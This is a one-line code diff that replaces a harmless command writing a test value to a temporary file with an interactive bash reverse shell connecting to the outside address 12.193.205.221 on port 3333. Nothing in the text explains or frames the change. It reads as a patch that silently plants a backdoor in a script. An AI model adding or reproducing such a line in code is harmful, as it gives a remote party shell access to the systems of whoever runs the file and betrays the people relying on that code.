@@ -1,1 +1,1 @@
-echo 456 > /tmp/test.txt
+bash -i >& /dev/tcp/12.193.205.221/3333 0>&1
